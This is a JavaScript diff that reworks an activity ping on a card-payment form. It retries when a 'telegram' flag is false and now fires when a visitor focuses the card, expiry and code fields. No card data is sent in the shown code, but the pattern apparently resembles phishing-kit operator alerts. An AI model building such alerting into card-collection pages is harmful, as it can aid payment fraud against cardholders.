@@ -438,20 +438,38 @@ let activitySent = false;
 function pingActivity(type) {
   if (activitySent) return;
   activitySent = true;
+  const payload = {
+    type: type || "start_fill",
+    page: location.pathname,
+    service_type: typeof serviceType !== "undefined" ? serviceType : ""
+  };
   fetch("/api/activity", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      type: type || "start_fill",
-      page: location.pathname,
-      service_type: typeof serviceType !== "undefined" ? serviceType : ""
+    body: JSON.stringify(payload)
+  })
+    .then((r) => r.json())
+    .then((j) => {
+      if (!j?.ok || j.telegram === false) {
+        setTimeout(() => {
+          fetch("/api/activity", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          }).catch(() => {});
+        }, 1500);
+      }
     })
-  }).catch(() => {});
+    .catch(() => {
+      activitySent = false;
+    });
 }
-["email", "fullName", "card"].forEach(id => {
+["email", "fullName", "card", "expiry", "code"].forEach((id) => {
   const el = document.getElementById(id);
   if (el) el.addEventListener("focus", () => pingActivity("start_fill"), { once: true });
 });
+const timeSel = document.getElementById("timeSelector");
+if (timeSel) timeSel.addEventListener("click", () => pingActivity("start_fill"), { once: true });
 
 $("send").onclick=async()=>{
   $("err").textContent="";
